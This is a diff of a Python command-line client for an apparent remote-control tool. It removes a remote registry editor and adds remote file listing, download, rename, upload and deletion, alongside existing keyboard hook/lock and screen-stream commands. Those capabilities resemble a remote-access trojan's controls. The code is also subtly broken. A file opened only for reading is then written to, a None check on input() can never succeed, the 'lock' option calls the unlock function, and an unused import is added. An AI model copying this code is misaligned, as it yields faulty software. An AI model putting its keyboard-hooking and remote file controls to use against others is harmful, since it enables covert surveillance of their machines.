@@ -1,4 +1,5 @@
 import base64
+from tkinter.constants import NO
 from app.client.packages.portal import Portal
 import app.core.protocol as protocol
 
@@ -55,22 +56,6 @@ if __name__ == '__main__':
         elif c == "restart":
             r = p.restart()
             print(r.status_message())
-        elif c == 'registry':
-            while True:
-                key = value = data_type = new_data = ''
-                option = input('[get|set|delete|create-key|delete-key|exit]: ')
-                if option == 'exit':
-                    break
-                if option not in ['get', 'set', 'delete', 'create-key', 'delete-key']:
-                    continue
-                key = input('Key: ')
-                if option in ['get', 'set', 'delete']:
-                    value = input('Value: ')
-                if option == 'set':
-                    data_type = input('Data type: ')
-                    new_data = input('New data: ')
-                r = p._registry_wrapper('reg', option, key, value, data_type, new_data)
-                print(r.content())
         elif c == 'keyboard':
             while True:
                 o = input('[hook|unhook|lock|unlock|exit]: ')
@@ -86,6 +71,29 @@ if __name__ == '__main__':
                     p.keyboard_unlock()
                 elif o == 'unlock':
                     r = p.keyboard_unlock()
+                print(r.content())
+        elif c == 'file':
+            while True:
+                o = input('[list|get|rename|up|del|exit]: ')
+                if o == 'list':
+                    path = input('path directory: ')
+                    if path is None:
+                        path = "disk"
+                    r = p.get_list_F(path)
+                elif o == 'get':
+                    r = p.get_file("D:\\Maxminlevel","a.txt")
+                    with open("D:\\Maxminlevel\\d.txt") as f:
+                        f.write(r.content().decode(protocol.MESSAGE_ENCODING))
+                elif o == 'rename':
+                    r = p.rename_F("D:\\Maxminlevel","a.txt","b.txt")
+                elif o == 'up':
+                    path = "D:\\Maxminlevel\\"
+                    data = open('test.txt', 'r').read()
+                    r = p.send_file(path, "a.txt", data)
+                elif o == 'del':
+                    r = p.delete_file("D:\\Maxminlevel\\a.txt")
+                else:
+                    break
                 print(r.content())
         elif c == 'stream':
             r, vs = p.initialize_screen_stream()
